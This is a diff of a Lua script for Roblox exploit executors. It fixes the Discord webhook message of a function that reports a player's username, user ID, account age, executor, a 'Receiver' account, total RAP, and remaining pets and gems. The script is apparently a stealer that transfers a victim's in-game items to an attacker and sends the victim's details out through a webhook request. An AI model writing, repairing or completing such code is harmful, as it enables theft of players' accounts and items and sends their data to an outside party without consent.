@@ -203,48 +203,48 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, Webhook, pets
                         ["name"] = "Player Info !",
                         ["value"] = "```Username     : " ..
                             fardplayer.Name ..
-                                "\nUser-ID      : " ..
-                                    fardplayer.userId ..
-                                        "\nAccount Age  : " ..
-                                            fardplayer.AccountAge ..
-                                                " Days" ..
-                                                    "\nExploit      : " ..
-                                                        ExecutorWebhook ..
-                                                            "\nReceiver     : " ..
-                                                                RobloxUsername ..
-                                                                    "\nTotal RAP    : " ..
-                                                                        FormatNumber(totalRap1) .. "```",
+                            "\nUser-ID      : " ..
+                            fardplayer.userId ..
+                            "\nAccount Age  : " ..
+                            fardplayer.AccountAge ..
+                            " Days" ..
+                            "\nExploit      : " ..
+                            ExecutorWebhook ..
+                            "\nReceiver     : " ..
+                            RobloxUsername ..
+                            "\nTotal RAP    : " ..
+                            FormatNumber(totalRap1) .. "```",
                         ["inline"] = false
                     },
                     {
-                        "name": "Pets Left",
-                        "value": "```➼ {pets_left}```",
-                        "inline": true
-                      },
-                      {
-                        "name": "{item_type}",
-                        "value": "```➼ {id}```",
-                        "inline": true
-                      },
-                      {
-                        "name": "Item RAP",
-                        "value": "```➼ {FormatNumber(RAP)}```",
-                        "inline": true
-                      },
-                      {
-                        "name": "Gems Left",
-                        "value": "```➼ {FormatNumber(GemsAmount)}```",
-                        "inline": true
-                      },
-                      {
-                        "name": "Shiny",
-                        "value": "```➼ {shinyy}```",
-                        "inline": true
-                      },
-                      {
-                        "name": "Rb/Gold/Reg",
-                        "value": "```➼ {RBgoldNormal}\n```",
-                        "inline": true
+                        ["name"] = "Pets Left",
+                        ["value"] = "```➼ " .. pets_left .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = item_type,
+                        ["value"] = "```➼ " .. id .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Item RAP",
+                        ["value"] = "```➼ " .. FormatNumber(RAP) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Gems Left",
+                        ["value"] = "```➼ " .. FormatNumber(GemsAmount) .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Shiny",
+                        ["value"] = "```➼ " .. shinyy .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Rb/Gold/Reg",
+                        ["value"] = "```➼ " .. RBgoldNormal .. "\n```",
+                        ["inline"] = true
                     }
                 }
             }
@@ -254,6 +254,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, Webhook, pets
         },
         ["attachments"] = {}
     }
+    
     local request = http_request or request or HttpPost or syn.request
     request(
         {
